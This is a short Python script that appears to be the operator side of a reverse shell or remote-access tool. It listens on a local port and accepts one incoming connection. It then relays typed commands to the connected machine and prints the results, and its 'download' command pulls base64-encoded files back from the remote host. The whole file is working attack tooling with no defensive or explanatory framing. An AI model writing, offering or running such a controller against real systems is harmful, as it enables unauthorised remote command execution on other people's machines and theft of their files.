import socket
import colorama
import base64
import sys


colorama.init()

LHOST = "127.0.0.1"
LPORT = 8080

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((LHOST, LPORT))
sock.listen(1)
print("Listening...")
client, addr = sock.accept()

while True:
    input_header = client.recv(1024)
    command = input(input_header.decode()).encode()

    if command.decode("utf-8").split(" ")[0] == "download":
        file = command.decode("utf-8").split(" ")[1][::-1]
        client.send(command)
        with open(file, "wb") as f:
            read = client.recv(1024)
            while read:
                f.write(base64.b64decode(read))
                read = client.recv(1024)
                if read == b"[+] Done!":
                    break
                
    if command == b"":
        print(">> ")
    else:
        client.send(command)
        data = client.recv(1024).decode("utf-8")
        if data == "exit":
            sys.exit()
        print(data)

client.close()
sock.close()